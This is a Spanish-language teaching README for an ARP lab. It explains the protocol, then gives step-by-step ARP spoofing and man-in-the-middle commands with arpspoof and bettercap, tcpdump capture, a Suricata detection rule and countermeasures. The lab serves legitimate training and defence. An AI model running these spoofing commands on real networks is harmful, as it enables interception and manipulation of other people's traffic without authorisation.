# README.md — Laboratorio Técnico: ARP (Protocolo y ARP Spoofing / MitM)
---
---

## 2. Definición técnica de ARP

**Nombre completo:** Address Resolution Protocol (ARP).

**Propósito:** Mapear direcciones de protocolo IPv4 (Capa 3) a direcciones de hardware MAC (Capa 2) dentro de un dominio de broadcast local (subred/VLAN).

**RFC de referencia:** RFC 826 (original) — observar implementaciones prácticas en stacks Linux/Windows/IOS.

---

## 3. Para qué se usa (casos de uso)

* Resolución IP→MAC para entrega de tramas Ethernet en la LAN.
* Verificación rápida de conflictos de dirección (gratuitous ARP).
* Integración con servicios de descubrimiento y DHCP.

**No enrutable:** ARP no funciona a través de routers; su ámbito es el dominio de broadcast de la Capa 2.

---

## 4. Operación y flujo (detalle operativo)

1. **Necesidad:** Un host A quiere enviar una trama Ethernet a IP destino B pero desconoce la MAC asociada.
2. **Construcción del ARP Request (Ethernet frame):**

   * Ethernet Destination MAC: FF\:FF\:FF\:FF\:FF\:FF (broadcast)
   * Ethernet Source MAC: MAC(A)
   * Ethertype: 0x0806
   * ARP payload fields: htype=1 (Ethernet), ptype=0x0800 (IPv4), hlen=6, plen=4, opcode=1 (request), SHA=MAC(A), SPA=IP(A), THA=00:00:00:00:00:00, TPA=IP(B).
3. **Propagación:** Todos los dispositivos en el dominio de broadcast reciben la trama; solo el que tiene SPA==TPA responde.
4. **ARP Reply (unicast):** El host B responde con opcode=2; THA=MAC(A), TPA=IP(A), SHA=MAC(B), SPA=IP(B). Esta respuesta se envía unicast a MAC(A).
5. **Actualización de ARP Cache:** Ambos hosts actualizan sus tablas ARP con la asociación IP→MAC recibida; entradas con TTL/aging.

**Entradas estáticas vs dinámicas:** Las entradas dinámicas tienen aging; las estáticas configuran asociaciones permanentes en el SO o dispositivo.

---



## 5. Comportamiento de cache y estados anómalos

* **ARP Cache:** Tabla local (SO) que almacena pares IP→MAC con tiempo de vida (ej. Linux \~60s a 5min dependiendo de parámetros).
* **Gratuitous ARP:** Un host anuncia su propia IP mediante un ARP Reply no solicitado; usado en failover/dup IP detection.
* **ARP Probe:** Variantes en protocolos de autoconfiguración y detección de duplicados.
* **Estados sospechosos:** cambios frecuentes de MAC para una misma IP, respuestas ARP no solicitadas, múltiples IPs apuntando a la misma MAC.

---

## 6. Alcance, limitaciones y seguridad intrínseca

* **Ámbito:** Funciona solo dentro de la LAN/VLAN (dominio broadcast).
* **Limitación:** Sin autenticación ni integridad en el protocolo base — lo hace vulnerable a suplantación.
* **Impacto de seguridad:** Permite posicionamiento MitM, vigilancia y manipulación de tráfico L2→L7 si no hay cifrado por encima.

---

## 7. Tipos de ataques relacionados con ARP

1. **ARP Spoofing / ARP Poisoning (técnica base):** Envío de respuestas ARP fraudulentas para forzar asociaciones IP→MAC incorrectas en las tablas ARP de las víctimas.

   * Modalidades: Gateway Spoofing (ataque contra la puerta de enlace), bidireccional (MitM entre dos hosts), agresivo (envenenamiento masivo para capturar tráfico de toda la subred).
2. **Man‑in‑the‑Middle (MitM) — consecuencia:** Intercepción, registro y modificación de tráfico entre víctimas.
3. **MAC Spoofing:** Cambiar la MAC del adaptador para eludir controles (port security, filtrado MAC).
4. **MAC Flooding:** Saturar la CAM table del switch para forzar modo fallback (flooding a puerto de CPU), permitiendo sniffing.
5. **ARP Cache Poisoning combinada con IP Spoofing:** Facilita ataques de amplificación y reflectores.

---

## 8. Procedimientos reproducibles (laboratorio) — comandos y secuencia

> **Advertencia:** Ejecute solo en laboratorio autorizado.

### 9.1 Preparación (Kali atacante)

```bash
# Identificar interfaz
ip -4 a
# Determinar gateway
ip route show default
# Habilitar forwarding temporal
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 9.2 Ataque simple: Gateway Spoofing (arpspoof)

```bash
# Envenenar a la víctima para que asocie la IP del gateway a la MAC del atacante
sudo arpspoof -i <iface> -t <IP_VICTIMA> <IP_GATEWAY>
# (Opcional) Envenenar al gateway para tráfico bidireccional
sudo arpspoof -i <iface> -t <IP_GATEWAY> <IP_VICTIMA>
```

### 9.3 Alternativa moderna: bettercap (recomendada para laboratorio avanzado)

```bash
sudo bettercap -iface <iface>
# Dentro del prompt
net.probe on
arp.spoof on
# Opciones: arp.spoof.targets = 192.168.1.10, arp.spoof.internal true
```

### 9.4 Verificación

* En la víctima:

  * `arp -a` o `ip neigh show` → la MAC asociada a la IP del gateway debe coincidir con la MAC del atacante.
* En el atacante:

  * `tcpdump -i <iface> -n host <IP_VICTIMA> -w captura.pcap`
  * Abrir `captura.pcap` en Wireshark: filtro `ip.addr == <IP_VICTIMA>` y/o `arp`.

### 9.5 Limpieza

```bash
# Detener herramientas (Ctrl+C)
# Desactivar forwarding si no se requiere
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
# En la víctima forzar reaprendizaje
ping -c 3 <IP_GATEWAY>
# Borrar entrada ARP (Linux)
sudo ip neigh flush <IP_GATEWAY>
```

---

## 10. Detección con Suricata — reglas y estrategia

### 10.1 Estrategia general

* Detectar respuestas ARP no solicitadas (replies sin request).
* Detectar cambios frecuentes de MAC asociada a una IP.
* Correlacionar con logs DHCP para detectar conflictos de asignación.

### 10.2 Ejemplo de firma Suricata (ilustrativa)

```
alert arp any any -> any any (msg:"ARP Spoofing - unsolicited ARP reply"; sid:1000001; rev:1;)
```

**Mejor práctica:** Implementar reglas que identifiquen patrones (ej. mismo IP anunciada con distintas MACs en ventana temporal corta) y usar EVE JSON para integrar alertas con SIEM.

---

## 11. Contramedidas prácticas (reducción de riesgo)

* **Dynamic ARP Inspection (DAI)** en switches gestionados + DHCP Snooping.
* **Static ARP entries** para hosts críticos (no escalable a gran escala).
* **Port Security / MAC Lockdown** en puertos de acceso.
* **Segmentación y micro‑segmentación** (VLANs, ACLs) para reducir superficie.
* **Monitorización y alertas**: detectar cambios rápidos en IP→MAC.
* **Cifrado extremo a extremo** (HTTPS, TLS, VPN) para minimizar impacto de MitM.

---

## 12. Recursos y referencias técnicas

* RFC 826 — An Ethernet Address Resolution Protocol.
* Documentación `bettercap`, `dsniff`, `ettercap`.
* Guías Linux: `ip neigh`, parámetros sysctl para aging y forwarding.
* Documentación Suricata: firmas y EVE output.

---

## 13. Checklist para ejecución en clase (resumen)

* [ ] Entorno aislado (VLAN/DMZ) y snapshots de VM.
* [ ] Herramientas instaladas (Kali: `bettercap`, `dsniff`, `tcpdump`).
* [ ] Sensor IDS con Suricata y reglas cargadas.
* [ ] Ejercicios: (1) comprobar ARP cache; (2) ejecutar arpspoof; (3) capturar pcap; (4) observar alertas Suricata; (5) aplicar mitigación.

---

## 14. Notas finales

Documento técnico — adaptarlo a direcciones IP, nombres de interfaz y políticas de su infraestructura de laboratorio. Mantener siempre la legalidad y autorización por escrito antes de realizar pruebas de intrusión.

*Fin del README técnico.*
